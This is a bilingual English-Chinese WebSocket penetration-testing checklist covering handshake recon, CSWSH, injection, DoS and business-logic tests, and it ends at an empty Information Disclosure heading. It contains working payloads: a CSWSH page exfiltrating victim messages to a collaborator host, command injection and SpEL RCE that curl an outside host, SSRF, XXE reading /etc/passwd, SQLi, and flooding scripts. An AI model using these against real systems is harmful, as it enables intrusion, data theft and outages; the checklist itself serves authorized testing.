---
created: 2026-03-17T04:16:43 (UTC +08:00)
tags: []
source: https://hetmehta.com/resources/Websocket-security

author: Het Mehta
---
# WebSocket 安全测试综合清单 --

> ## Excerpt
>
> Cybersecurity research, and personal experiences by Het Mehta.

---

[Skip to content](https://hetmehta.com/resources/Websocket-security#main-content)

By Het Mehta | Published: 2025-06-03 | Last Updated: 3/16/2026

作者：Het Mehta | 发布日期：2025 年 6 月 3 日 | 最后更新日期：2026 年 3 月 16 日

## Introduction  介绍

WebSockets enable persistent, full-duplex, bidirectional communication between clients and servers — powering real-time features like live chat, financial trading platforms, multiplayer games, and collaborative tools. Unlike standard HTTP, a single WebSocket connection stays open indefinitely, meaning a single security flaw grants an attacker continuous, real-time access rather than a one-off request.

WebSocket 能够实现客户端和服务器之间持久、全双工的双向通信，从而为实时聊天、金融交易平台、多人游戏和协作工具等功能提供支持。与标准 HTTP 不同，单个 WebSocket 连接会无限期地保持打开状态，这意味着即使存在一个安全漏洞，攻击者也能获得持续的实时访问权限，而不仅仅是一次性请求。

WebSocket security testing is a distinct discipline from regular web app testing. Traditional HTTP scanners and WAFs often miss WebSocket message traffic entirely, seeing only the initial HTTP upgrade handshake. This makes WebSocket endpoints a high-value, low-visibility target in bug bounty programs and pentest engagements alike.

WebSocket 安全测试与常规 Web 应用测试截然不同。传统的 HTTP 扫描器和 WAF 通常会完全忽略 WebSocket 消息流量，只能看到初始的 HTTP 升级握手。这使得 WebSocket 端点成为漏洞赏金计划和渗透测试中高价值但低可见性的目标。

This checklist is based on the [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html), PortSwigger Web Security Academy, PayloadsAllTheThings, and real-world pentest techniques.

本清单基于 [OWASP WebSocket 安全速查表](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html) 、PortSwigger Web 安全学院、PayloadsAllTheThings 和真实世界的渗透测试技术。

- [OWASP WebSocket Security Cheat Sheet

  OWASP WebSocket 安全速查表](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — WebSocket Attacks

  PortSwigger 网络安全学院 — WebSocket 攻击](https://portswigger.net/web-security/websockets)
- [PayloadsAllTheThings — WebSockets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Sockets/README.md)

## 🧪 Testing Environment Setup

🧪 测试环境搭建

WebSocket testing requires tools that can intercept and manipulate both the HTTP upgrade handshake and the subsequent bidirectional message stream — standard HTTP proxies alone are not enough.

WebSocket 测试需要能够拦截和操纵 HTTP 升级握手以及后续双向消息流的工具——仅靠标准的 HTTP 代理是不够的。

- **Burp Suite Pro:** WebSocket history tab, intercept, Repeater (native WebSocket support), Intruder fuzzing, and the `socketsleuth` BApp extension for advanced message management.

  **Burp Suite Pro：** WebSocket 历史记录选项卡、拦截器、Repeater（原生 WebSocket 支持）、Intruder 模糊测试，以及用于高级消息管理的 `socketsleuth` BApp 扩展。
- **OWASP ZAP:** Free WebSocket interception, fuzzing, and breakpoint support. Navigate to the Sites tree to inspect handshake and message frames.

  **OWASP ZAP：** 提供免费的 WebSocket 拦截、模糊测试和断点支持。导航至站点树以检查握手和消息帧。
- **wscat:** Lightweight CLI WebSocket client. Install with `npm install -g wscat`. Ideal for quick connection tests and manual message sends.

  **wscat：** 轻量级命令行 WebSocket 客户端。使用 `npm install -g wscat` 安装。非常适合快速连接测试和手动发送消息。
- **websocat:** More powerful CLI tool — supports piping, scripting, binary messages, and proxy chaining. Alternative to wscat for complex scenarios.

  **websocat：** 功能更强大的命令行工具——支持管道、脚本、二进制消息和代理链。适用于复杂场景，可替代 wscat。
- **wsrepl:** Interactive WebSocket REPL built for pentesting (by Doyensec). TUI interface, automation support, plugin system, compatible with curl argument syntax. Install with `pip install wsrepl`.

  **wsrepl：** 专为渗透测试构建的交互式 WebSocket REPL（作者：Doyensec）。它具有 TUI 界面、自动化支持、插件系统，并兼容 curl 参数语法。使用 `pip install wsrepl` 进行安装。
- **WSSiP:** Node.js-based WebSocket/Socket.IO proxy with a GUI — useful for inspecting Socket.IO traffic alongside raw WebSockets.

  **WSSiP：** 基于 Node.js 的 WebSocket/Socket.IO 代理，带有 GUI — 可用于检查 Socket.IO 流量以及原始 WebSocket 流量。
- **mitmproxy:** Supports WebSocket flow inspection and message modification. Useful for scripted, automated interception pipelines.

  **mitmproxy：** 支持 WebSocket 流检查和消息修改。适用于脚本化的自动化拦截管道。
- **Wireshark:** Captures and decodes raw WebSocket frames — essential for binary protocol analysis and low-level debugging.

  **Wireshark：** 捕获和解码原始 WebSocket 帧——对于二进制协议分析和底层调试至关重要。
- **Python `websockets` / `asyncio`:** Write custom scripts for fuzzing, flooding, replay attacks, and protocol-specific automation.

  **Python `websockets` / `asyncio` ：** 编写自定义脚本以进行模糊测试、泛洪攻击、重放攻击和特定协议的自动化。
- **Browser DevTools:** Network tab → WS filter shows all frames in real time. No install required — great for initial recon.

  **浏览器开发者工具：** 网络选项卡 → WS 过滤器实时显示所有帧。无需安装——非常适合初步侦察。

## Phase 1: Reconnaissance & Handshake Analysis

第一阶段：侦察与握手分析

Before sending a single payload, map the WebSocket attack surface. The HTTP upgrade handshake is the gateway — it reveals the authentication mechanism, origin validation posture, subprotocols, and whether the connection is encrypted. Missing a misconfiguration here means missing the most common critical finding: CSWSH.

在发送任何有效载荷之前，务必绘制 WebSocket 攻击面图。HTTP 升级握手是关键的入口——它会暴露身份验证机制、来源验证状态、子协议以及连接是否加密。如果此处配置错误被忽略，就意味着会错过最常见的关键漏洞：CSWSH（WebSocket 安全策略错误）。

- **Discover WebSocket Endpoints:

  发现 WebSocket 端点：**

  - Open the target app, open DevTools (F12) → Network tab → filter by **WS**. Look for HTTP 101 Switching Protocols responses.

    打开目标应用程序，打开开发者工具（F12）→网络选项卡→按 **WS** 筛选。查找 HTTP 101 切换协议响应。
  - In Burp Suite, check **Proxy → WebSockets history** tab after browsing the application. All WebSocket connections and messages are logged here.

    在 Burp Suite 中，浏览应用程序后，检查 **“代理”→“WebSocket 历史**记录”选项卡。所有 WebSocket 连接和消息都会记录在此处。
  - Search JS source files for `new WebSocket(`, `io.connect(` (Socket.IO), or `wss://` / `ws://` strings to find undocumented endpoints.

    在 JS 源文件中搜索 `new WebSocket(` , `io.connect(` (Socket.IO), 或 `wss://` / `ws://` 字符串，以查找未记录的端点。

    ```bash
    # Search JS bundle for WebSocket instantiation
    grep -r "new WebSocket\|wss://\|ws://" ./js/
    # Or in browser DevTools console on the target page:
    # Search Sources panel for "WebSocket" to find all connection points
    ```
  - Use Shodan to find exposed WebSocket services: `title:"WebSocket" port:443` or `http.component:"socket.io"`.

    使用 Shodan 查找公开的 WebSocket 服务： `title:"WebSocket" port:443` 或 `http.component:"socket.io"` 。
  - **Tools:** Browser DevTools, Burp Suite WebSockets history, `grep`, Shodan.

    **工具：** 浏览器开发者工具、Burp Suite WebSockets 历史记录、 `grep` 、Shodan。
- **Analyze the HTTP Upgrade Handshake:

  分析 HTTP 升级握手：**

  - Capture the full handshake request in Burp. Verify it includes `Upgrade: websocket`, `Connection: Upgrade`, `Sec-WebSocket-Key`, and `Sec-WebSocket-Version: 13`.

    在 Burp 中捕获完整的握手请求。验证它是否包含 `Upgrade: websocket` 、 `Connection: Upgrade` 、 `Sec-WebSocket-Key` 和 `Sec-WebSocket-Version: 13` 。

    ```http
    GET /chat HTTP/1.1
    Host: target.com
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
    Sec-WebSocket-Version: 13
    Origin: https://target.com
    Cookie: session=abc123
    ```
  - Check whether the connection uses `wss://` (encrypted) or `ws://` (plaintext). Any use of `ws://` in production is a finding.

    检查连接使用的是 `wss://` （加密）还是 `ws://` （明文）。在生产环境中使用 `ws://` 属于安全隐患。
  - Note the `Origin` header value and whether it is validated server-side — this is the root cause of CSWSH.

    请注意 `Origin` 标头值以及它是否在服务器端进行验证——这是 CSWSH 的根本原因。
  - Check for CSRF tokens or nonces in the handshake query string or headers.

    检查握手查询字符串或标头中是否存在 CSRF 令牌或 nonce。
  - Identify authentication mechanism: session cookie, `Authorization: Bearer` header, token in query string, or no authentication at all.

    识别身份验证机制：会话 cookie、 `Authorization: Bearer` 标头、查询字符串中的令牌，或者根本不进行身份验证。
  - Note any `Sec-WebSocket-Protocol` (subprotocol: e.g., `chat`, `stomp`, `graphql-ws`) or `Sec-WebSocket-Extensions` (e.g., `permessage-deflate`) headers.

    注意任何 `Sec-WebSocket-Protocol` （子协议：例如 `chat` 、 `stomp` 、 `graphql-ws` ）或 `Sec-WebSocket-Extensions` （例如 `permessage-deflate` ）标头。
  - **Tools:** Burp Suite Proxy, Browser DevTools.

    **工具：** Burp Suite Proxy、浏览器开发者工具。
- **Understand Message Format:

  了解消息格式：**

  - Determine message format: JSON, plain text, binary (protobuf, MessagePack), XML, STOMP frames, or Socket.IO envelope.

    确定消息格式：JSON、纯文本、二进制（protobuf、MessagePack）、XML、STOMP 帧或 Socket.IO 信封。
  - Map all distinct message types and their fields — this is your injection and access control attack surface.

    将所有不同的消息类型及其字段绘制出来——这就是你的注入和访问控制攻击面。
  - Connect manually with wscat to observe the raw message flow:

    使用 wscat 手动连接以观察原始消息流：

    ```bash
    # Basic connection
    wscat -c wss://target.com/ws

    # With auth cookie
    wscat -c wss://target.com/ws -H "Cookie: session=abc123"

    # With Bearer token
    wscat -c wss://target.com/ws -H "Authorization: Bearer <token>"

    # With custom origin header
    wscat -c wss://target.com/ws -H "Origin: https://evil.com"
    ```
  - **Tools:** wscat, websocat, wsrepl, Burp Suite WebSockets history, Browser DevTools.

    **工具：** wscat、websocat、wsrepl、Burp Suite WebSockets 历史记录、浏览器开发者工具。

## Phase 2: Transport Security

第二阶段：运输安全

WebSocket transport security mirrors TLS testing for HTTPS. Unencrypted `ws://` connections expose all message traffic to network-level eavesdropping and tampering. Even encrypted connections can be weakened by misconfigured TLS, outdated protocol versions, or insecure compression.

WebSocket 传输安全机制与 HTTPS 的 TLS 测试类似。未加密的 `ws://` 连接会将所有消息流量暴露给网络层窃听和篡改。即使是加密连接，也可能因 TLS 配置错误、协议版本过时或压缩不安全而变得脆弱。

- **Encryption Checks:  加密检查：**

  - Verify all WebSocket connections use `wss://` (WebSocket over TLS). Any `ws://` connection in production — even for "non-sensitive" features — is a finding.

    验证所有 WebSocket 连接是否都使用 `wss://` （基于 TLS 的 WebSocket）。生产环境中任何 `ws://` 连接——即使是“非敏感”功能——都属于安全隐患。
  - Run `testssl.sh` or `sslyze` against the WebSocket server endpoint to check TLS version, cipher strength, and certificate validity.

    对 WebSocket 服务器端点运行 `testssl.sh` 或 `sslyze` 以检查 TLS 版本、密码强度和证书有效性。

    ```bash
    # TLS quality check on the WebSocket server's HTTPS endpoint
    ./testssl.sh https://target.com

    # sslyze alternative
    sslyze target.com:443
    ```
  - Check for mixed content issues: a page loaded over HTTPS that opens a `ws://` connection — browsers block this but older apps may still attempt it.

    检查是否存在混合内容问题：通过 HTTPS 加载的页面打开了 `ws://` 连接——浏览器会阻止这种连接，但旧版应用程序可能仍然会尝试连接。
  - **Tools:** `testssl.sh`, `sslyze`, Browser DevTools Console (mixed content warnings).

    **工具：** `testssl.sh` 、 `sslyze` 、浏览器开发者工具控制台（混合内容警告）。
- **Protocol & Compression Checks:

  协议和压缩检查：**

  - Verify the server requires RFC 6455 (WebSocket version 13). Attempt to connect using a lower `Sec-WebSocket-Version` value to check for legacy protocol support:

    确认服务器需要 RFC 6455（WebSocket 版本 13）。尝试使用较低的 `Sec-WebSocket-Version` 值进行连接，以检查是否支持旧版协议：

    ```http
    GET /ws HTTP/1.1
    Host: target.com
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
    Sec-WebSocket-Version: 0
    Origin: https://target.com
    ```
  - Check if `permessage-deflate` compression is enabled (visible in `Sec-WebSocket-Extensions` response header). Compression + secret data can be vulnerable to CRIME/BREACH-style attacks in some scenarios.

    检查是否启用了 `permessage-deflate` 压缩（可在 `Sec-WebSocket-Extensions` 响应头中查看）。在某些情况下，压缩数据加上敏感信息可能容易受到 CRIME/BREACH 式攻击。
  - **Tools:** Burp Suite Proxy (edit handshake headers), wscat.

    **工具：** Burp Suite Proxy（编辑握手标头）、wscat。

## Phase 3: Authentication, Authorization & CSWSH 🎯

第三阶段：身份验证、授权和 CSWSH 🎯

Cross-Site WebSocket Hijacking (CSWSH) is the WebSocket equivalent of CSRF — and often more damaging, since an attacker gets a live, persistent, bidirectional connection rather than a single forged request. It is one of the highest-impact WebSocket vulnerabilities and appears frequently in bug bounty programs. Real-world examples include a 2023 Gitpod account takeover via insufficient origin validation.

跨站 WebSocket 劫持（CSWSH）是 WebSocket 领域的 CSRF 漏洞，而且通常危害更大，因为攻击者获得的是一个持续的、双向的连接，而不仅仅是一个伪造的请求。它是影响最大的 WebSocket 漏洞之一，经常出现在漏洞赏金计划中。现实案例包括 2023 年利用来源验证不足导致的 Gitpod 账户被盗用事件。

- **Origin Header Validation (CSWSH):

  源标头验证 (CSWSH)：**

  - In Burp, intercept the WebSocket handshake and modify the `Origin` header to a different domain. If the server returns HTTP 101, origin validation is absent — this is a CSWSH vulnerability.

    在 Burp 中，拦截 WebSocket 握手过程，并将 `Origin` 标头修改为不同的域名。如果服务器返回 HTTP 101 状态码，则说明缺少来源验证——这是一个 CSWSH 漏洞。

    ```http
    # Original handshake - modify Origin in Burp Repeater:
    Origin: https://evil.com
    # or
    Origin: null
    # or
    Origin: https://target.com.evil.com
    ```
  - Test for substring/suffix bypass in origin validation — if the server checks that the origin _contains_ the domain name rather than exact-matching it:

    源验证中是否存在子字符串/后缀绕过测试——服务器检查源_是否包含_域名而不是完全匹配：

    ```bash
    # Bypass attempts for a server checking "target.com" as substring:
    Origin: https://nottarget.com
    Origin: https://target.com.attacker.com
    Origin: https://attacker-target.com
    Origin: https://target.com@attacker.com
    ```
  - If origin validation is missing and auth is cookie-based, prove CSWSH exploitability with a PoC HTML page that exfiltrates messages to Burp Collaborator:

    如果缺少来源验证且身份验证基于 cookie，则使用 PoC HTML 页面证明 CSWSH 的可利用性，该页面会将消息泄露到 Burp Collaborator：

    ```html
    <!-- CSWSH PoC: exfiltrate victim's WebSocket data -->
    <script>
      var ws = new WebSocket('wss://target.com/chat');
      ws.onopen = function() {
        ws.send('READY'); // trigger server to send history/data
      };
      ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR.oastify.com', {
          method: 'POST',
          mode: 'no-cors',
          body: event.data
        });
      };
    </script>
    ```
  - **Tools:** Burp Suite Repeater (WebSocket), Burp Collaborator, custom HTML PoC page.

    **工具：** Burp Suite Repeater（WebSocket）、Burp Collaborator、自定义 HTML PoC 页面。
- **Authentication Bypass:  身份验证绕过：**

  - Attempt to connect to the WebSocket endpoint with no credentials at all — no cookie, no token. Some endpoints are accidentally unauthenticated.

    尝试在没有任何凭据（无 cookie，无 token）的情况下连接到 WebSocket 端点。某些端点可能意外地未通过身份验证。

    ```bash
    # Connect with no auth
    wscat -c wss://target.com/ws

    # Connect with an invalid/expired token
    wscat -c wss://target.com/ws -H "Cookie: session=invalid"
    wscat -c "wss://target.com/ws?token=INVALID"
    ```
  - If the token is passed in the query string (`?token=...`), check server access logs or Burp HTTP history — query string tokens appear in logs and referrer headers, which is an information disclosure risk.

    如果令牌在查询字符串中传递（ `?token=...` ），请检查服务器访问日志或 Burp HTTP 历史记录——查询字符串令牌会出现在日志和引用标头中，这存在信息泄露风险。
  - Test whether the server re-validates authentication mid-connection. Authenticate, then invalidate the session server-side (logout from another tab), and check if the WebSocket connection remains active.

    测试服务器是否会在连接过程中重新验证身份。进行身份验证，然后在服务器端使会话失效（从另一个标签页注销），并检查 WebSocket 连接是否仍然处于活动状态。
  - Check if logging out closes all active WebSocket connections. If the connection persists after logout, session invalidation is incomplete.

    检查注销操作是否关闭了所有活动的 WebSocket 连接。如果注销后连接仍然存在，则会话失效过程未完成。
  - **Tools:** wscat, websocat, Burp Suite Proxy.

    **工具：** wscat、websocat、Burp Suite Proxy。
- **Message-Level Authorization (Broken Access Control):

  消息级授权（访问控制失效）：**

  - Identify messages that reference resources by ID (user IDs, order IDs, room IDs). Replay them with a different account's ID to test for IDOR/BOLA over WebSocket.

    识别引用资源 ID（用户 ID、订单 ID、房间 ID）的消息。使用不同的帐户 ID 重放这些消息，以测试 WebSocket 上的 IDOR/BOLA 漏洞。

    ```json
    // Original message (your account):
    {"action": "subscribe", "channel": "user_notifications_123"}

    // IDOR test: change ID to another user's
    {"action": "subscribe", "channel": "user_notifications_124"}

    // BFLA test: send admin-only action as regular user
    {"action": "delete_user", "user_id": "456"}
    ```
  - Use Burp Repeater (WebSocket mode) to replay modified messages without re-establishing the connection. This lets you iterate quickly on authorization tests.

    使用 Burp Repeater（WebSocket 模式）无需重新建立连接即可重放修改后的消息。这使您能够快速迭代授权测试。
  - Test privilege escalation: send messages with admin-level `action` or `role` fields as a low-privilege user. Check if the server enforces authorization per-message or only at connection time.

    测试权限提升：以低权限用户身份发送包含管理员级别 `action` 或 `role` 字段的消息。检查服务器是按消息强制执行授权，还是仅在连接时强制执行授权。
  - **Tools:** Burp Suite Repeater, wscat, wsrepl.

    **工具：** Burp Suite Repeater、wscat、wsrepl。

## Phase 4: Input Validation & Injection Attacks 💉

第四阶段：输入验证与注入攻击💉

WebSocket messages are just another input channel — every injection class that applies to HTTP parameters also applies to WebSocket message fields. The key difference is that WebSocket payloads are often JSON or binary, so you need to adapt your payloads to the message format. Burp's WebSocket Repeater and Turbo Intruder extension make this systematic.

WebSocket 消息只是另一种输入通道——适用于 HTTP 参数的任何注入类也适用于 WebSocket 消息字段。关键区别在于 WebSocket 有效负载通常是 JSON 或二进制格式，因此您需要将有效负载适配到消息格式。Burp 的 WebSocket Repeater 和 Turbo Intruder 扩展程序使这一过程变得系统化。

- **Cross-Site Scripting (XSS) via WebSocket:

  通过 WebSocket 进行跨站脚本攻击 (XSS)：**

  - Inject XSS payloads into WebSocket message fields that are reflected in the UI of other connected users (e.g., chat messages, notifications, usernames).

    将 XSS 有效载荷注入到 WebSocket 消息字段中，这些字段会反映在其他已连接用户的 UI 中（例如，聊天消息、通知、用户名）。

    ```json
    // XSS via WebSocket chat message
    {"type": "message", "content": "<img src=x onerror=alert(document.domain)>"}

    // SVG-based XSS
    {"type": "message", "content": "<svg/onload=alert(1)>"}

    // JS protocol in link field
    {"type": "profile_update", "website": "javascript:alert(document.cookie)"}
    ```
  - Check if injected content is reflected to other users in real-time — WebSocket XSS can affect all currently connected users simultaneously, making it a stored XSS with broadcast scope.

    检查注入的内容是否实时反映给其他用户——WebSocket XSS 可以同时影响所有当前连接的用户，使其成为具有广播范围的存储型 XSS。
  - **Payload Concepts:** Same XSS payloads as HTTP — adapt to the JSON field structure. Test both the field value and any field name that might be reflected.

    **有效载荷概念：** XSS 有效载荷与 HTTP 相同——需适应 JSON 字段结构。测试字段值以及可能反映出的任何字段名称。
- **SQL Injection via WebSocket:

  通过 WebSocket 进行 SQL 注入：**

  - Inject SQLi payloads into WebSocket message fields that appear to query data (search, filter, lookup operations).

    将 SQLi 有效载荷注入到 WebSocket 消息字段中，这些字段看起来像是要查询数据（搜索、筛选、查找操作）。

    ```json
    // Error-based SQLi probe
    {"action": "search", "query": "' OR 1=1--"}

    // Boolean-based blind
    {"action": "search", "query": "' AND 1=1--"}
    {"action": "search", "query": "' AND 1=2--"}

    // Time-based blind (MySQL)
    {"action": "search", "query": "' AND SLEEP(5)--"}

    // UNION-based (adjust columns to match)
    {"action": "search", "query": "' UNION SELECT null,username,password FROM users--"}
    ```
  - Use the `ws-harness.py` / Burp HTTP Middleware technique to route WebSocket traffic through sqlmap:

    使用 `ws-harness.py` / Burp HTTP 中间件技术，通过 sqlmap 路由 WebSocket 流量：

    ```bash
    # Use ws-harness to bridge WebSocket <-> HTTP for sqlmap
    # 1. Start the harness pointing at the vulnerable WebSocket endpoint
    python ws-harness.py -u "ws://target.com/ws" -m message_template.txt

    # 2. Run sqlmap against the harness's local HTTP listener
    sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch --level=5
    ```
- **Command Injection, SSRF, XXE via WebSocket:

  通过 WebSocket 进行命令注入、SSRF 和 XXE 攻击：**

  - Test command injection in fields that appear to trigger server-side actions (e.g., file processing, report generation, ping/diagnostic features).

    在看似会触发服务器端操作的字段中测试命令注入（例如，文件处理、报告生成、ping/诊断功能）。

    ```json
    // Command injection probes
    {"action": "ping", "host": "127.0.0.1; whoami"}
    {"action": "ping", "host": "127.0.0.1 | id"}
    {"action": "ping", "host": "`curl https://YOUR-COLLABORATOR.oastify.com`"}

    // SSRF probe
    {"action": "fetch_url", "url": "http://169.254.169.254/latest/meta-data/"}
    {"action": "fetch_url", "url": "http://internal-service.local/admin"}
    ```
  - For XML-based WebSocket protocols, test XXE in any XML-formatted message field.

    对于基于 XML 的 WebSocket 协议，在任何 XML 格式的消息字段中测试 XXE。

    ```xml
    <!-- XXE via WebSocket XML message -->
    <?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <message>&xxe;</message>
    ```
  - **Tools:** Burp Suite Repeater (WebSocket), wscat, Burp Collaborator (for OOB detection), sqlmap with ws-harness.

    **工具：** Burp Suite Repeater（WebSocket）、wscat、Burp Collaborator（用于 OOB 检测）、sqlmap 和 ws-harness。
- **Message Manipulation & Replay:

  信息操纵与重放：**

  - Capture legitimate messages and replay them with modified parameters to test for insecure direct object references, price manipulation, quantity changes, or state transitions.

    捕获合法消息并使用修改后的参数重放它们，以测试是否存在不安全的直接对象引用、价格操纵、数量变化或状态转换。
  - Test for replay attack vulnerability: replay the exact same message (including any nonce or timestamp) and check if the server accepts it again. If so, replay protection is absent.

    测试重放攻击漏洞：重放完全相同的消息（包括随机数或时间戳），并检查服务器是否再次接受。如果接受，则说明重放保护机制缺失。

    ```bash
    # Replay a captured message using wsrepl
    wsrepl -u wss://target.com/ws -P auth_plugin.py
    # Then paste the captured message and resend it

    # Or use Burp WebSocket Repeater:
    # Right-click message in WS history → Send to Repeater → edit and resend
    ```
  - Test mass assignment: send extra JSON fields in messages (e.g., `"role":"admin"`, `"is_verified":true`, `"balance":9999`) and check if the server honors them.

    测试批量分配：在消息中发送额外的 JSON 字段（例如， `"role":"admin"` ， `"is_verified":true` ， `"balance":9999` ”），并检查服务器是否接受它们。

    ```json
    // Mass assignment probe: add unexpected fields
    {
      "action": "update_profile",
      "name": "Attacker",
      "role": "admin",
      "is_verified": true,
      "credit_balance": 99999
    }
    ```
  - **Tools:** Burp Suite Repeater, wsrepl, wscat.

    **工具：** Burp Suite Repeater、wsrepl、wscat。

## Phase 5: Denial-of-Service & Resource Exhaustion

第五阶段：拒绝服务攻击和资源耗尽

WebSocket's persistent connection model fundamentally changes the DoS attack surface. Unlike HTTP where each request is independent, WebSocket allows an attacker to hold connections open indefinitely, flood message queues faster than the server can process them, or exhaust file descriptors across the system. These tests should always be performed on a staging environment with explicit permission.

WebSocket 的持久连接模型从根本上改变了 DoS 攻击面。与 HTTP 中每个请求都是独立的不同，WebSocket 允许攻击者无限期地保持连接打开状态，以服务器无法处理的速度向消息队列发送大量消息，或者耗尽系统中的文件描述符。这些测试应始终在获得明确授权的测试环境中执行。

- **Connection Exhaustion:  连接耗尽：**

  - Open many simultaneous WebSocket connections from a single IP to test per-IP connection limits:

    从单个 IP 地址同时打开多个 WebSocket 连接，以测试每个 IP 地址的连接数限制：

    ```python
    import asyncio, websockets

    async def hold_connection():
        async with websockets.connect("wss://target.com/ws") as ws:
            await asyncio.sleep(300)  # hold open for 5 min

    async def main():
        tasks = [hold_connection() for _ in range(200)]
        await asyncio.gather(*tasks, return_exceptions=True)

    asyncio.run(main())
    ```
  - Test whether the server enforces per-user (or per-session) connection limits, not just per-IP limits.

    测试服务器是否强制执行按用户（或按会话）的连接限制，而不仅仅是按 IP 的连接限制。
  - **Tools:** Python `websockets`, custom scripts.

    **工具：** Python `websockets` ，自定义脚本。
- **Message Flooding & Oversized Frames:

  信息过载和超大边框：**

  - Send messages at a very high rate to test for server-side rate limiting. Verify the server enforces limits and closes or throttles the connection rather than queuing indefinitely.

    以极高的速率发送消息，测试服务器端速率限制。验证服务器是否强制执行限制，并关闭或限制连接，而不是无限期地排队等待。

    ```python
    import asyncio, websockets

    async def flood():
        async with websockets.connect("wss://target.com/ws",
                                      extra_headers={"Cookie": "session=abc123"}) as ws:
            for _ in range(10000):
                await ws.send('{"type":"ping"}')

    asyncio.run(flood())
    ```
  - Send an oversized message frame to test for the `maxPayload` limit. The server should close the connection with code 1009 (Message Too Big), not crash or hang.

    发送一个过大的消息帧来测试 `maxPayload` 限制。服务器应该以错误代码 1009（消息过大）关闭连接，而不是崩溃或挂起。

    ```python
    import asyncio, websockets

    async def big_frame():
        async with websockets.connect("wss://target.com/ws") as ws:
            # Send 10MB payload
            await ws.send("A" * 10 * 1024 * 1024)
            print(await ws.recv())

    asyncio.run(big_frame())
    ```
  - Test for backpressure handling: send messages faster than the server can process them and monitor server memory/CPU usage. A server without flow control can be memory-exhausted.

    测试反压处理：以高于服务器处理速度发送消息，并监控服务器内存/CPU 使用情况。没有流量控制的服务器可能会耗尽内存。
  - **Tools:** Python `websockets`, websocat (`websocat -n wss://target.com/ws --binary-prefix <payload_file>`).

    **工具：** Python `websockets` ，websocat（ `websocat -n wss://target.com/ws --binary-prefix <payload_file>` ）。
- **Idle Connection & Ping/Pong Handling:

  空闲连接和 Ping/Pong 处理：**

  - Open a connection and leave it completely idle — verify the server eventually closes it with an idle timeout rather than holding it open indefinitely.

    打开连接并使其完全空闲——验证服务器最终是否会因空闲超时而关闭连接，而不是无限期地保持连接打开状态。
  - Send a large number of ping frames rapidly and check if the server handles them gracefully or becomes resource-constrained.

    快速发送大量 ping 帧，并检查服务器是否能优雅地处理它们，或者是否出现资源限制。

## Phase 6: Business Logic & Protocol Edge Cases

第六阶段：业务逻辑和协议边缘案例

WebSocket applications often implement complex, stateful business logic over the message channel — trading operations, multi-user collaboration, real-time auctions — that automated scanners cannot reason about. This phase requires understanding what the application actually does and finding ways to abuse the intended flows.

WebSocket 应用通常会在消息通道上实现复杂的、有状态的业务逻辑——例如交易操作、多用户协作和实时拍卖——而这些逻辑是自动扫描器无法理解的。因此，这一阶段需要了解应用的实际运行机制，并找到利用其预期流程漏洞的方法。

- **Business Logic Abuse:  业务逻辑滥用：**

  - Test race conditions in real-time operations: send the same action (e.g., purchase, bid, transfer) from multiple WebSocket connections simultaneously and check for duplicate execution.

    测试实时操作中的竞争条件：同时从多个 WebSocket 连接发送相同的操作（例如，购买、出价、转账），并检查重复执行。
  - Test sequence bypass: send later-step messages (e.g., "confirm\_order") without completing earlier steps (e.g., "add\_payment") to check if workflow steps are enforced server-side.

    测试序列绕过：发送后续步骤消息（例如，“confirm\_order”）而不完成前面的步骤（例如，“add\_payment”），以检查工作流步骤是否在服务器端强制执行。
  - Test negative values, zero, and extremely large values in numeric fields (prices, quantities, transfer amounts).

    测试数值字段（价格、数量、转账金额）中的负值、零值和极大值。

    ```json
    // Numeric boundary tests
    {"action": "transfer", "amount": -1000}
    {"action": "transfer", "amount": 0}
    {"action": "transfer", "amount": 9999999999}
    {"action": "bid", "price": 0.000001}
    ```
- **Protocol-Level Edge Cases:

  协议层面的极端情况：**

  - Send malformed JSON or broken message structures — the server should respond with a protocol error, not crash or expose internal error details.

    发送格式错误的 JSON 或损坏的消息结构——服务器应响应协议错误，而不是崩溃或暴露内部错误详情。

    ```bash
    # Send malformed JSON via wscat
    wscat -c wss://target.com/ws
    > {"action": "search", "query":   # incomplete JSON
    > not_json_at_all
    > {}
    > null
    > []
    ```
  - Test sending binary frames to a text-only endpoint and vice versa — this can trigger unhandled exceptions in poorly written servers.

    测试向纯文本端点发送二进制帧以及向纯文本端点发送二进制帧——这可能会在编写不佳的服务器中引发未处理的异常。
  - Test the reconnection behavior — does the server re-validate authentication and session state when a dropped client reconnects? Or does it skip validation on reconnect?

    测试重新连接行为——当断开连接的客户端重新连接时，服务器是否会重新验证身份验证和会话状态？还是会在重新连接时跳过验证？
  - For STOMP-over-WebSocket (common in Spring apps), test for CVE-2018-1270-style SpEL injection via the `selector` header in STOMP SUBSCRIBE frames. Spring's in-memory broker evaluated the `selector` header using an unsandboxed `StandardEvaluationContext`, enabling RCE. The fix was upgrading to Spring Framework 5.0.5+ or 4.3.15+.

    对于基于 WebSocket 的 STOMP 攻击（常见于 Spring 应用），请检查 STOMP SUBSCRIBE 帧中的 `selector` 头部是否存在 CVE-2018-1270 式的 SpEL 注入漏洞。Spring 的内存代理使用未沙盒化的 `StandardEvaluationContext` 来评估 `selector` 头部，从而导致远程代码执行 (RCE)。修复方法是升级到 Spring Framework 5.0.5+ 或 4.3.15+。

    ```bash
    # CVE-2018-1270: SpEL injection via STOMP selector header
    # The selector header is evaluated as a Spring Expression (SpEL) — use an unsandboxed StandardEvaluationContext
    # Affects Spring Framework 5.0.x < 5.0.5, 4.3.x < 4.3.15
    # Step 1: Connect to STOMP endpoint
    wscat -c wss://target.com/stomp -s stomp
    > CONNECT
    > accept-version:1.1,1.2
    > heart-beat:0,0
    > 
    > ^@
    # Step 2: Send SUBSCRIBE frame with malicious selector header (SpEL RCE payload)
    > SUBSCRIBE
    > id:sub-0
    > destination:/topic/greetings
    > selector:T(java.lang.Runtime).getRuntime().exec('curl https://YOUR-COLLABORATOR.oastify.com')
    > 
    > ^@
    ```
- **Information Disclosure:  信息披露：**

